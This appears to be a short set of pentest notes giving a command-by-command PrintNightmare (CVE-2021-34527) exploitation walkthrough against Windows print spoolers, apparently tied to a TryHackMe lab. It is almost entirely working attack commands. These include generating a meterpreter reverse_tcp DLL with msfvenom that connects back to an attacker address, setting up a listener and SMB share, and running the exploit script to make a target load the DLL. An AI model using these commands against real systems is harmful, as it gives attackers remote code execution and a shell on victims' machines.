# \[CVE-2021-34527] - PrintNighmare

## Exploitation

```bash
pip install pyasn1

git clone https://github.com/tryhackme/CVE-2021-1675.git 
git clone https://github.com/cube0x0/impacket
python3 -m pip install .
```

### msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 

# msfconsole:
#    use exploit/multi/handler
#    set payload windows/x64/meterpreter/reverse_tcp
#    set lhost VALUE 
#    set lport VALUE
#		run -j
#		jobs
```

### Scripts

```bash
smbserver.py share /root/Desktop/share/ -smb2support
```

```bash
rpcdump.py @10.10.133.215 | egrep 'MS-RPRN|MS-PAR'
```

```bash
python3 CVE-2021-1675.py DOMAIN-FQDN/username:password@DOMAIN-IP '\\192.168.0.100\share\malicious.dll
```
